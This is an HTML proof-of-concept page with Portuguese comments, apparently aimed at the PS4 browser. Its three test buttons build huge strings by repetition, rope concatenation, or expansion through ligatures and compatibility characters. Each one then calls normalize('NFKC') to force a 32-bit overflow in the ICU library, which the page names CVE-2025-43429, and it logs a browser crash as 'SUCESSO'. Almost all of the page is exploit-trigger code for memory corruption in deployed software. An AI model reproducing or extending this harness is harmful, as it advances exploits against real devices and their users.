<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 ICU CVE-2025-43429 (Refined)</title>
    <style>
        body { font-family: 'Courier New', monospace; padding: 20px; background-color: #1a1a1a; color: #0f0; }
        h1 { color: #fff; border-bottom: 2px solid #555; padding-bottom: 10px; }
        .controls { margin-bottom: 20px; background: #333; padding: 15px; border-radius: 8px; }
        button { 
            display: block;
            width: 100%;
            margin: 10px 0; 
            padding: 15px; 
            font-size: 16px; 
            font-weight: bold;
            cursor: pointer; 
            background-color: #444; 
            color: #fff; 
            border: 1px solid #666; 
            border-radius: 4px;
            transition: background 0.2s;
        }
        button:hover { background-color: #666; }
        button.danger { background-color: #800; border-color: #f00; }
        button.danger:hover { background-color: #a00; }
        
        #log { 
            height: 400px; 
            border: 1px solid #0f0; 
            overflow-y: scroll; 
            padding: 10px; 
            background: #000; 
            font-size: 14px;
            white-space: pre-wrap;
        }
        .error { color: #ff5555; }
        .highlight { color: #ffff55; }
    </style>
</head>
<body>
    <h1>CVE-2025-43429: ICU Normalize (Anti-OOM)</h1>
    
    <div class="controls">
        <p>Selecione uma estratégia de alocação. Se o navegador fechar ou travar, a vulnerabilidade foi ativada.</p>
        <button class="danger" onclick="test218d_PreciseFactor()">Test 218d: Fator Preciso (0.24)</button>
        <button class="danger" onclick="test218e_NativeRope()">Test 218e: Native JSC Rope (Concat)</button>
        <button class="danger" onclick="test218f_HighExpansion()">Test 218f: Alta Expansão (Small Input)</button>
        <hr style="border-color: #555;">
        <button onclick="clearLog()">Limpar Log</button>
    </div>

    <div id="log">=== AGUARDANDO COMANDO ===</div>

    <script>
        const log = document.getElementById('log');
        let crashes = 0;

        function addLog(msg, isError = false) {
            const div = document.createElement('div');
            const time = new Date().toLocaleTimeString();
            div.textContent = `[${time}] ${msg}`;
            if (isError) div.className = 'error';
            if (msg.includes('Triggering')) div.className = 'highlight';
            log.appendChild(div);
            console.log(msg);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            log.innerHTML = '=== LOG LIMPO ===';
        }

        // =================================================================
        // VARIAÇÃO D: Fator Preciso (0.24)
        // Objetivo: Alocar ~480MB para ficar no limite da RAM disponível
        // mas com tamanho lógico suficiente para estourar int32 na lib ICU.
        // =================================================================
        function test218d_PreciseFactor() {
            addLog('>>> INICIANDO TESTE 218d (Precise Factor 0.24) <<<');
            try {
                let len = 0x7FFFFFF0; // Alvo de overflow 32-bit
                let numExpandChars = 16;
                let fillLen = len - numExpandChars;
                let expandChar = "\u00A8"; // Expande na normalização
                let fillChar = "a";
                
                let compatFactor = 0.24; 
                
                addLog(`1. Calculando tamanhos (Fator: ${compatFactor})...`);
                
                // Alocação direta
                let largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * compatFactor));
                
                addLog(`2. String criada na Heap (~${(largeStr.length/1024/1024).toFixed(2)} MB).`);
                addLog(`3. EXECUTANDO normalize('NFKC')...`);
                addLog('   (Se o console travar ou fechar agora, SUCESSO)');
                
                let normalized = largeStr.normalize('NFKC');
                
                addLog('4. Falha: O código continuou rodando (Não vulnerável ou RAM insuficiente).');
            } catch(e) {
                addLog('ERRO: ' + e.message, true);
                if (e.message.includes("Out of memory")) {
                    addLog('-> Resultado: OOM. Tente o teste 218e ou 218f.', true);
                }
            }
        }

        // =================================================================
        // VARIAÇÃO E: Native JSC Rope (Concatenação)
        // Objetivo: Usar a otimização de "Rope" do WebKit. Strings concatenadas
        // não ocupam memória contígua imediatamente. A memória só é exigida
        // massivamente no momento do .normalize(), tentando driblar o OOM inicial.
        // =================================================================
        function test218e_NativeRope() {
            addLog('>>> INICIANDO TESTE 218e (Native JSC Rope) <<<');
            try {
                let targetSize = 1024 * 1024 * 400; // Alvo: 400MB
                let chunkSize = 1024 * 1024 * 10;   // Chunks de 10MB
                
                let expandChar = "\u00A8".repeat(100); 
                let chunk = "a".repeat(chunkSize);
                
                addLog(`1. Construindo Rope String de ${targetSize/1024/1024}MB...`);
                
                let s = expandChar;
                let current = 0;
                
                // Loop de concatenação cria árvore ConsString na memória
                while(current < targetSize) {
                    s += chunk;
                    current += chunkSize;
                }
                
                addLog('2. Rope pronta (Lazy Allocation).');
                addLog('3. EXECUTANDO normalize(). Isso forçará o Flattening + ICU...');
                
                let normalized = s.normalize('NFKC');
                
                addLog('4. Falha: Execução continuou normalmente.');
            } catch(e) {
                addLog('ERRO: ' + e.message, true);
            }
        }

        // =================================================================
        // VARIAÇÃO F: Alta Expansão (Entrada Pequena -> Saída Gigante)
        // Objetivo: Usar caracteres que triplicam de tamanho (ligaduras).
        // Entrada de 150MB -> Saída potencial de 450MB.
        // O estouro ocorre na escrita do buffer de destino, não na leitura.
        // =================================================================
        function test218f_HighExpansion() {
            addLog('>>> INICIANDO TESTE 218f (High Expansion) <<<');
            try {
                // \uFB03 (ligadura ffi) normaliza para "ffi" (3 chars)
                let expandChar = "\uFB03"; 
                
                // String de entrada relativamente leve para o PS4 (150MB)
                let size = 1024 * 1024 * 150; 
                
                addLog(`1. Alocando Input (${size/1024/1024} MB)...`);
                
                let s = expandChar.repeat(size);
                
                addLog(`2. Input pronto. Potencial Output: ~${(size*3)/1024/1024} MB.`);
                addLog('3. EXECUTANDO normalize()...');
                
                let normalized = s.normalize('NFKC');
                
                addLog('4. Falha: Execução continuou normalmente.');
            } catch(e) {
                addLog('ERRO: ' + e.message, true);
            }
        }
    </script>
</body>
</html>
